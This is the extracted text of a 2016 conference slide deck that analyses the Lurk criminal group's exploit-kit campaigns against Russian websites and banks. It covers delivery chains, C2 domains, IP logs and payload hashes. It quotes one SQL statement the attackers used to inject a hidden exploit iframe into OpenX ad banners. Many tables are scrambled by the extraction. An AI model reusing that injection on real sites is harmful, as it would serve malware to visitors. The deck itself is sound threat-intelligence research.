How to steal money from ATM machines
become rich, NOT famous and NOT get caught :)

oops..

Lurk, Carbanak and attacks on banking infrastructure
Vladimir Kropotov Fyodor Yarochkin
HITCON December 2016

Agenda
· 2016 - the year when attacks on banking infrastructure gained a lot of publicity
· Attack vectors in banking infrastructure
· evolution of bank targeting criminal activities
· How it all started: the Historical overview of Lurk
· So many buzzwords: Lurk, Carbanak, Anarak, Buhtrap, Cobalt ... :)

whoami

whoami

Fyodor Yarochkin - 8 years of Vladimir Kropotov - several years

banking penetration testing at major companies in Russia as

experience

network security analyst

a bit of threat intel experience

threat expert

Incidents of Interest in 2016
· Swift breaches · ATM attacks

ATM breach japan
· Cards using data dumps

ATM breach Taiwan
· Very well known.. skip :)

less known cases

ATM breaches in Kyrgyzstan

ATM breaches in Tajikistan

Possible attack vectors

Attack vectors in Banking Infrastructure

Traditional: bank customers
· Online banking. Well developed, targeted by a number of malware families. Getting very advanced (bypassing one time passwords)
· Cards (credit/debit). Skimmers. Been around for a while

Should not forget the principle of ..

Issues with Bank networks
· "Shell" structure: hard outside, soft inside · Often poor segmentation within internal network · Complexity of legacy applications · Complexity of relationships with 3rd party business
partners, maintenance and support (TeamViewer into a backend system, anyone? ;))

Why only now..?
· Banking networks: step learning curve for an attacker. (observation: in a breach of a bank in Singapore in 2001, had password collecting software installed on online banking web server
· Attackers were only _THAT_ smart

and then we had this..
http://www.kp.ru/daily/2
Engineers with banking experience looking for jobs

How it started... early days of Lurk

A quick intro
Where did the data come from? What did we see?
What we didn't see :-)

Lurk timeline in "nutshell"
· The Lurk - early observations in 2011, 2012 · The Lurk - becoming extremely active, attacking .RU segment of Internet · The Lurk - upgrading infrastructure · A blog post about "fileless" appears securelist.com · Lurk - going global · Lurk is given attention by Kaffeine (of malwaredontneedcoffee famous blog) · Lurk is given attention by CISCO TALOS security team · Microsoft discussed flash zero day exploited by the Lurk (https://blogs.technet.microsoft.com/mmpc/2014/02/10/a-
journey-to-cve-2013-5330-exploit/) · The securelist.com publishes multiple public reports(s) about Lurk activity · BOOM ka-BOOM! - the Lurk group is being busted (50 people arrested) · The securelist.com publishes "post-mortem" report

the First observation of Lurk

Other Basic definitions
· What is drive-by (anyone?) · What is `landing' · exploit vs payload · Understanding intermediate victims and `watering hole'
attacks

Bodiless or fileless payload
Lurk was the first criminal web exploitation group to use bodiless/fileless non-persistent payload in exploit chain.
Multi-staged payload delivery:
Lurk used initial non-persistent payload which probed the target of interest before making decision if any additional payload needs to be served.

Distinct network footprint of Lurk

Victims in February 15 2012

A magic pattern :-)
· This URL signature proved itself to be very effective for Lurk URL detection at its early stages
· ^[A-Z0-9]{4}$

The pattern at work
Surprisingly the pattern worked very well

Lurk exploitation chain May 2012

text/ht ml

text/ht ml

application/javaarchive

application/octetstream

Lurk target fingerprinting
Lurk only served additional stages of multi-staged malware, if initial analysis of compromised target confirmed it to be a target of interest.

"bodiless" artifacts:

Lurk exploitation chain September 2012

Lurk exploitation chain September 2012 two days later

mime type sequences as another pattern

text/ht ml

text/ht ml

application/javaarchive

application/octetstream

Targets and intermediate victims

2012

2013

2014

0

3dnews.ru

3dnews.ru

3dnews.ru

9

1

adriver.ru

adriver.ru

adfox.ru

10

11

2

akdi.ru

adv.vz.ru

auto.ru

3

bg.ru

aif.ru

4

com.adv.vz.ru

akdi.ru

5

fobos.tv

gazeta.ru

12 avtovzglyad.ru
13 drive.ru
14
glavbukh.ru 15

6

gazeta.ru

glavbukh.ru

inosmi.ru

16

7

rian.ru

infox.ru

irr.ru

17

8

newsru.com

klerk.ru

nalogoved.ru

18

2012 newsru.ru rian.ru slon.ru target-m.ru tks.ru torrogrill.ru tvrain.ru uik-ek.ru ura.ru vesti.ru

2013 mn.ru newsru.com rg.ru servernews.ru slon.ru tks.ru topnews.ru tvrain.ru vesti.ru

2014 news.mail.ru ria.ru riarealty.ru rnk.ru rusplt.ru smotri.com sport.mail.ru tks.ru utro.ua womanhit.ru

Lurk Infrastructure

Exploit kit infrastructure

Infrastructure: domains
domain registration appeared to be automated and paid via anonymous payment methods

Addperiod abuse(?)

Reistration vs. active use of Lurk domains

20/08/1 http://www.tks.r 70.32.39.1 80. http://xezareta.info/inde text/html 200 607 24959 Mozilla

3 11:33 u/

08

0 xm.html

/4.0

20/08/1 3 11:33

70.32.39.1 80. http://xezareta.info/054 applicati 200 293 23784 Mozilla

08

0 RIwj

on/3dr

/4.0

20/08/1 3 11:33

70.32.39.1 80. http://xezareta.info/154 applicati 200 185 14375 Java/1

08

0 RIwj

on/octet

3

.6.0_3

-stream

1

Exploit serving domains
Courtesy of domaintools.com

C2 patterns and infrastructure

Lurk C2 calls

Met

Date

IP

Port hod

URL

Mime Bytes Bytes type out in

2-Nov-2012 184.173.226.246

http://rime41claim.com/search?hl=us&source=hp&q

80 POST =22282240&aq=f&aqi=&aql=&oq=

text/plain

3041 256

2-Nov-2012 184.173.226.245

http://landlady48s.com/search?hl=us&source=hp&q

80 GET =58959&aq=f&aqi=&aql=&oq=58959

text/html

831 336115

2-Nov-2012 184.173.226.246

http://rime41claim.com/search?hl=us&source=hp&q

80 POST =1000000000503347&aq=f&aqi=&aql=&oq=

text/html

241 252

C2 domains used a unique registration email
laval.schock1953@hotmail.com-> landlady48s.com twoee.barnard1951@hotmail.com -> gratuity31t.com avery.wilkens1980@hotmail.com -> rime41claim.com

Lurk Exploitation Tactics

Main Attack Vectors
·Drive-by THROUGH direct compromise ·Drive-by THROUGH programmatic advertising platforms (ad networks) compromise ·Software distribution package tampering

intermediate victim, site 1
·memcached Cache poisoning Observed: continuous flood of connection requests to TCP 11211 (default memcached port) Cached pages were updated with `iframed' versions of these pages on the fly

intermediate victim, site 2
Machine was compromised via an ssh vulnerability
Apache web server had additional module installed: mod_proxy_mysql.so (didn't link any mysql libraries)
This is possibly a modified version of http://pastebin.com/raw/6wWVsstj as reported by succuri (https://blog.sucuri.net/2013/01/server-side-iframe-injectionsvia-apache-modules-and-sshd-backdoor.html)

Intermediate victim, site #3
OpenX compromise · webshell installed · The Lurk group periodically modified banners table with
update `banners` set htmltemplate=concat(htmltemplate, '<script>document.write(\'<div style="position:absolute;left:1000px;top:-1280px;">
<iframe src="http://couldvestuck.org/XZAH"></iframe></div>\'); </script>') where storagetype='html'
This causes the OpenX script `/www/delivery/ajs.php' to produce the HTML code with this iframe snippet appearing at the page.

Distribution timings
General technique: · Serve exploit payload only when a potential victim is likely
to visit watering hole website. · Return redirect to google.com otherwise

Lurk - active hours

Lurk distribution by day o f week

Lurk Exploits and Payloads

Lurk exploits
Lurk's favourite: JAVA CVE-2011-3544 Use of Flash payload for target fingerprinting Using flash CVE-20135330 exploit

Lurk 1st stage payload over time
2013-Aug

Lurk requests (failed vs serving)

Lurk detectability by AV vendors
Ad the time of Campaign

Lurk detectability by AV vendors
Now

Some payloads for reference

hash
7382ef1638e6ce8fc5c0cf766cea2e93ae9e8ea4ef891f79a1589f1978779aa0 73eda8a8c2511e8cf7261da36be78064c16094e3e83ebdeb76e7ee7803a32f69 d947e1ad59d4dfeaa6872a6bda701e67d40a265f711f74984aa286a59daf1373

type
java jar java jar

Description based on verdicts
CVE-2011-3544 exploit CVE-2011-3544 exploit

Flash

CVE-2013-5330

Lurk and Angler 2013 2014 2015 2016

similarities between lurk and and angler
indexm.htm pattern use of bodiless/fileless payload shared infrastructure

Discussed by Kaffeine
http://malware.dontneedcoffee.com/2014/08/angler-ek-now-capable-of-fileless.html

Discussed by Kaffeine
Lurk exploit kit is called XXX
http://malware.dontneedcoffee.com/2015/12/xxx-is-angler-ek.html

Talos Team analysis in 2016
http://blog.talosintel.com/2016/07/lurk-crimeware-connections.html

The group's operational security (OPSEC)
We can learn from the video about the group's operational security practices: · Disposable phones · Phone jammers · long-distance wifi dongles

Lurk Arrests (May 2016)

Lurk, Carbanak, Anunak, Cobalt, Buhtrap, Odinaff
· So many buzzwords, Any relationship?

=] Questions

